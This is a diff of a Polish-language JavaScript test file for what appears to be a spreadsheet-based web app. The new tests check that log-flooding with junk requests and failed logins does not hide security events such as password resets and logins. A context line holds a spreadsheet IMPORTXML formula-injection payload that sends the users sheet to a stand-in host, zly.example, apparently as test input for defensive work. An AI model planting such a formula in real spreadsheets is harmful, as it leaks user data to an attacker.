@@ -94,13 +94,34 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
 }
 /* ---- 5. limit dzienników ---- */
 {
-  const B = swiezy({ ustaw: 'WPISOW_NA_GODZINE = 50;' });
-  for (let i = 0; i < 400; i++) B.post({ akcja: 'reset_hasla', kod: '1234' + (i % 10), telefon: '1' });
+  const B = swiezy({ ustaw: 'WPISOW_NA_GODZINE = 50; WAZNYCH_NA_KOD = 20; WAZNYCH_NA_GODZINE = 30;' });
+  for (let i = 0; i < 400; i++) B.post({ akcja: 'logowanie', kod: '55555', haslo: 'x' + i });      // nieznany kod: po 8 próbach każda zostawia „logowanie_odrzucone”
+  const wpisow = B.get('Log').getLastRow() - 1;
+  ok('dziennik ma limit wpisów na godzinę (400 odrzuconych logowań → nie więcej niż limit)', wpisow > 0 && wpisow <= 50, 'wpisów: ' + wpisow);
   for (let i = 0; i < 400; i++) B.post({ akcja: 'sesja', kod: '12345', rodzaj: 'logowanie' }, { haslo: 'haslo123' });
-  const wpisow = (B.get('Log') ? B.get('Log').getLastRow() : 0) + (B.get('Sesje') ? B.get('Sesje').getLastRow() : 0) - 2;
-  ok('dzienniki mają limit wpisów na godzinę (800 zapytań → nie więcej niż limit)', wpisow <= 52, 'wpisów: ' + wpisow);
+  const sesji = B.get('Sesje').getLastRow() - 1;
+  ok('wpisy po uwierzytelnieniu (rejestr sesji) mają osobny przydział, ale z limitem na kod (400 → 20)', sesji === 20, 'wpisów: ' + sesji);
+  const L0 = B.get('Log').getLastRow();
+  B.post({ akcja: 'reset_hasla', kod: '33333', telefon: '700800900' }); B.post({ akcja: 'zmien_haslo', kod: '33333', stare_haslo: '700800900', nowe_haslo: 'noweHaslo9' }); B.post({ akcja: 'logowanie', kod: '33333', haslo: 'noweHaslo9' });
+  ok('po zalewie dzienników udany reset, zmiana hasła i logowanie innego konta dalej są w Log', B.get('Log').w.slice(L0).map(r => r[2] + ':' + r[3]).join() === 'reset_hasla:OK,zmiana_hasla:OK (telefonem),logowanie_www:OK (haslo)', JSON.stringify(B.get('Log').w.slice(L0).map(r => r.slice(1, 4))));
   B.dalej(3601 * 1000); const przed = B.get('Sesje').getLastRow(); B.post({ akcja: 'sesja', kod: '12345', rodzaj: 'wylogowanie' }, { haslo: 'haslo123' });
   ok('po godzinie dzienniki znów przyjmują wpisy', B.get('Sesje').getLastRow() === przed + 1);
+}
+/* ---- 5b. zalew zapytań bez hasła nie ukrywa zdarzeń bezpieczeństwa ---- */
+{
+  const B = swiezy(); const H = { haslo: 'haslo123' };
+  B.get('Ustawienia').w[1][1] = 'Tajne-Haslo-2026'; B.get('Ustawienia').w[2][1] = '2099-12-31'; B.get('Ustawienia').w[3][1] = 'odbiorca@firma.pl';
+  const L0 = B.get('Log').getLastRow();
+  for (let i = 0; i < 3001; i++) B.post({ akcja: 'reset_hasla', kod: 'x' + i, telefon: '1' });
+  for (let i = 0; i < 3000; i++) B.post({ akcja: 'haslo_paczki', kod: '99999' }, { bezPodpisu: true });
+  ok('6000 śmieciowych zapytań (zły format kodu, odmowy hasła paczki) zostawia po jednym wpisie na godzinę', B.get('Log').getLastRow() - L0 === 2, 'wpisów: ' + (B.get('Log').getLastRow() - L0));
+  for (let i = 0; i < 3100; i++) B.post({ akcja: 'logowanie', kod: '55555', haslo: 'x' + i });      // wspólna pula wyczerpana
+  const L1 = B.get('Log').getLastRow();
+  const odp = [B.post({ akcja: 'reset_hasla', kod: '12345', telefon: '600100200' }), B.post({ akcja: 'zmien_haslo', kod: '12345', stare_haslo: '600100200', nowe_haslo: 'Nowe-haslo-1' }), B.post({ akcja: 'logowanie', kod: '12345', haslo: 'Nowe-haslo-1' }), B.post({ akcja: 'haslo_paczki', kod: '12345' }, { haslo: 'Nowe-haslo-1' })];
+  const nowe = B.get('Log').w.slice(L1).map(r => r[2]);
+  ok('przy wyczerpanej wspólnej puli reset, zmiana hasła, logowanie i wydanie hasła paczki zostawiają ślad', odp.every(o => o.status === 'ok') && nowe.join() === 'reset_hasla,zmiana_hasla,logowanie_www,haslo_paczki', JSON.stringify(nowe));
+  B.dalej(3601 * 1000); const L2 = B.get('Log').getLastRow(); B.post({ akcja: 'reset_hasla', kod: 'x', telefon: '1' });
+  ok('po godzinie zagregowane zdarzenie znów zostawia (jeden) wpis', B.get('Log').getLastRow() === L2 + 1);
 }
 /* ---- 6. podpis ---- */
 {
